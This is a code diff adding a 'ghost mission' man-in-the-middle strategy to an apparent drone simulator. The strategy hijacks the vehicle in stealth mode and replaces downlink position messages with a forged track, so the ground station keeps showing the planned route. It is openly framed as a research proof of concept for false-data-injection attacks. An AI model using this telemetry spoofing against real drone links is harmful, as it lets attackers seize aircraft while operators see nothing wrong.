@@ -32,11 +32,12 @@ from __future__ import annotations
 import logging
 import threading
 from dataclasses import asdict, dataclass
+from math import atan2, degrees, hypot
 from typing import TYPE_CHECKING, Any, ClassVar, TypeAlias, TypeVar, cast
 
 from pymavlink.dialects.v20 import ardupilotmega as mavlink
 
-from simulator.helpers.coordinates import GRA
+from simulator.helpers.coordinates import ENU, GRA
 
 if TYPE_CHECKING:
     from collections.abc import Callable, Mapping, Sequence
@@ -824,4 +825,123 @@ class CloakPositionStrategy(MITMStrategy):
             position.vy,
             position.vz,
             position.hdg,
+        )
+
+
+@MITMStrategy.register("ghost_mission")
+class GhostMissionStrategy(InterventionStrategy):
+    """
+    Hijack the vehicle while feeding the GCS a fabricated "mission continues" track.
+
+    A step past the stealth hijack (:class:`InterventionStrategy` with
+    ``stealth=True``): that one hides the *mode* change so the GCS keeps seeing
+    AUTO, but the real position still flows through — so the map shows the drone
+    veering off. This strategy additionally *rewrites* the downlink position, so
+    the GCS's map shows the drone calmly flying its original planned route while
+    the real vehicle is driven elsewhere by the hijack. It is the drone-downlink
+    form of a false-data-injection / "ghost telemetry" attack: show the operator
+    a normal picture while the physical process is subverted.
+
+    It reuses the parent's hijack + :class:`StealthModeMask` wholesale and adds
+    one thing: once the hijack engages, every ``GLOBAL_POSITION_INT`` on the
+    downlink is replaced with a fake fix dead-reckoned along the planned route.
+    Up to that instant the real position is still on-plan, so it passes through
+    untouched and the fabrication is seamless.
+
+    **Naive by design** — this is a proof of concept, not an airtight forgery:
+
+    - The fake fix marches in a straight line from the hijack point to the
+      *final* planned waypoint at ``navigation_speed``, then holds there. For a
+      roughly straight mission that matches the plan; a bent route would be
+      cut-cornered.
+    - Only position is faked. ``MISSION_CURRENT`` seq, ``NAV_CONTROLLER_OUTPUT``
+      and ``VFR_HUD`` still carry the truth, so a cross-check beyond the map
+      would expose it. Altitude is held at the real cruise value (level route).
+
+    ``route`` is the mission's ENU points (the same list the vehicle flies),
+    relative to the run origin; ``navigation_speed`` is the cruise speed in m/s.
+    """
+
+    def __init__(
+        self,
+        intervention: Intervention | Mapping[str, Any],
+        route: Sequence[ENU],
+        navigation_speed: float = 5.0,
+    ) -> None:
+        super().__init__(intervention, stealth=True)
+        # Rebuilt as `ENU`: a notebook passes `ENU`s directly, while on the far
+        # side of the MITM subprocess boundary `route` arrives as serialized
+        # `[x, y, z]` lists — this normalizes both so `_ghost_fix` can use `.x`/`.y`.
+        self._route = [ENU(wp[0], wp[1], wp[2]) for wp in route]
+        self._speed = navigation_speed
+        # Fabrication state, anchored the instant the hijack engages.
+        self._anchor: ENU | None = None
+        self._t0_ms: int = 0
+        self._alt_mm: int = 0
+        self._relative_alt_mm: int = 0
+        # Builder only constructs the fake message; the relay re-packs it with
+        # the vehicle's sysid, so the forged fix reads as vehicle-origin.
+        self._builder = mavlink.MAVLink(None, srcSystem=255, srcComponent=200)
+        self._spec = MITMSpec(
+            strategy_class="ghost_mission",
+            kwargs={
+                "intervention": self._intervention.to_dict(),
+                "route": [list(wp) for wp in self._route],
+                "navigation_speed": navigation_speed,
+            },
+        )
+
+    def on_downlink(self, msg: MAVMsg) -> MAVMsg | None:
+        """Run the stealth hijack, then overwrite position once it has engaged."""
+        out = super().on_downlink(msg)
+        if out is None or out.get_type() != "GLOBAL_POSITION_INT":
+            return out
+        # Before the hijack engages the real fix is still on-plan: let it pass.
+        if not self._mode_mask.active:
+            return out
+        return self._ghost_fix(cast("mavlink.MAVLink_global_position_int_message", out))
+
+    def _ghost_fix(
+        self, position: mavlink.MAVLink_global_position_int_message
+    ) -> MAVMsg:
+        """Replace a real fix with one dead-reckoned along the planned route."""
+        if self.ctx is None or not self._route:
+            return position
+        origin = self.ctx.gra_origin
+        if self._anchor is None:
+            self._anchor = origin.to_rel(
+                GRA.from_global_int(position.lat, position.lon, position.alt)
+            )
+            self._t0_ms = int(position.time_boot_ms)
+            self._alt_mm = int(position.alt)
+            self._relative_alt_mm = int(position.relative_alt)
+            logging.info(
+                "MITM ghost: faking planned-mission track from ENU (%.1f, %.1f)",
+                self._anchor.x,
+                self._anchor.y,
+            )
+        anchor = self._anchor
+        dest = self._route[-1]
+        dx, dy = dest.x - anchor.x, dest.y - anchor.y
+        span = hypot(dx, dy)
+        elapsed = max(0.0, (int(position.time_boot_ms) - self._t0_ms) / 1000.0)
+        travelled = min(self._speed * elapsed, span)
+        ux, uy = (dx / span, dy / span) if span > 1e-6 else (0.0, 0.0)
+        ghost = ENU(anchor.x + ux * travelled, anchor.y + uy * travelled, anchor.z)
+        gra = origin.to_abs(ghost)
+        moving = travelled < span
+        speed_cms = int(self._speed * 100) if moving else 0
+        heading_cdeg = (
+            int(degrees(atan2(ux, uy)) % 360 * 100) if moving else position.hdg
+        )
+        return self._builder.global_position_int_encode(
+            position.time_boot_ms,
+            int(gra.lat * 1e7),
+            int(gra.lon * 1e7),
+            self._alt_mm,
+            self._relative_alt_mm,
+            int(uy * speed_cms),  # vx: north component
+            int(ux * speed_cms),  # vy: east component
+            0,
+            heading_cdeg,
         )
